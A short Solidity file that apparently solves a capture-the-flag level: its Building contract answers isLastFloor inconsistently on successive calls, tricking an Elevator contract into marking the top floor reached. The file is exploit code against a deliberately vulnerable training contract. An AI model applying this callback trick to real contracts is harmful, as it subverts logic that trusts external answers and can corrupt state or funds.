// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./11Elevator.sol";

contract Building {
    Elevator public elevator;
    bool public entered = true;

    constructor(address elevatorAddress) {
        elevator = Elevator(elevatorAddress);
    }

    function solveChallenge() public {
        elevator.goTo(1);
    }

    function isLastFloor(uint256) external returns (bool) {
        entered = !entered;
        return entered;
    }
}
